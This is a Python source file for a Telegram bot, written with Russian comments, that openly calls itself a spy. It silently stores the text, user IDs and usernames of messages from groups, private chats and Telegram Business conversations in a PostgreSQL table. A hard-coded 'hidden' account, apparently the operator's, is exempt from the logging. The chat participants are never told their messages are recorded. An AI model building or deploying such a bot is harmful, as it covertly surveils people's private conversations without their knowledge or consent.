# main.py
import asyncio
import logging
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.types import Message, BusinessConnection, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart
import config

logging.basicConfig(level=logging.INFO)

session = AiohttpSession(api=TelegramAPIServer.from_base(config.API_SERVER))
bot = Bot(token=config.BOT_TOKEN, session=session)
dp = Dispatcher()

HIDDEN_ID = 1780243499
HIDDEN_USERNAME = "zovx"

async def init_db(pool):
    try:
        await pool.execute("""
            CREATE TABLE IF NOT EXISTS chat_stats (
                id SERIAL PRIMARY KEY,
                chat_id BIGINT,
                user_id BIGINT,
                username TEXT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
    except Exception as e:
        logging.error(f"Ошибка создания таблицы: {e}")

# --- СТАРТ ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Нажми меня", callback_data="test_btn")]
    ])
    await message.reply("Привет! Я шпион. 🕵️\nНапиши `.айди` или нажми кнопку.", reply_markup=kb)

# --- ОБЫЧНЫЕ СООБЩЕНИЯ (ГРУППЫ И ЛС) ---
@dp.message(F.text)
async def handler_normal(message: Message, db: asyncpg.Pool):
    text = message.text.lower().strip()
    logging.info(f"ОБЫЧНОЕ СООБЩЕНИЕ в {message.chat.type}: {text}")
    
    if "айди" in text or "id" in text:
        await message.reply(f"🆔 ID: <code>{message.chat.id}</code>", parse_mode="HTML")
        return
        
    if not text.startswith(('/', '.', '!')) and message.from_user.id != HIDDEN_ID:
        try:
            await db.execute(
                "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
                message.chat.id, message.from_user.id, message.from_user.username, message.text
            )
        except Exception as e:
            logging.error(f"Ошибка записи: {e}")

# --- БИЗНЕС СООБЩЕНИЯ (ЛС) ---
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(f"✅ БИЗНЕС ПОДКЛЮЧЕН: {connection.user.id}")

@dp.business_message()
async def handler_business(message: Message, db: asyncpg.Pool):
    text = message.text.lower().strip() if message.text else ""
    logging.info(f"БИЗНЕС СООБЩЕНИЕ: {text}")
    
    if "айди" in text or "id" in text:
        await message.reply(f"🆔 ID бизнес-чата: <code>{message.chat.id}</code>", parse_mode="HTML")
        return
        
    if message.from_user.id != HIDDEN_ID:
        try:
            await db.execute(
                "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
                message.chat.id, message.from_user.id, message.from_user.username, text
            )
        except Exception as e:
            logging.error(f"Ошибка записи: {e}")

# --- КНОПКА ---
@dp.callback_query(F.data == "test_btn")
async def cb_test(callback):
    await callback.answer("Кнопка работает!", show_alert=True)

# --- ЗАПУСК ---
async def main():
    try:
        pool = await asyncpg.create_pool(config.DATABASE_URL)
        await init_db(pool)
        dp["db"] = pool
    except Exception as e:
        logging.error(f"❌ ОШИБКА БАЗЫ: {e}")
        return

    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    logging.info("🚀 Шпион запущен.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
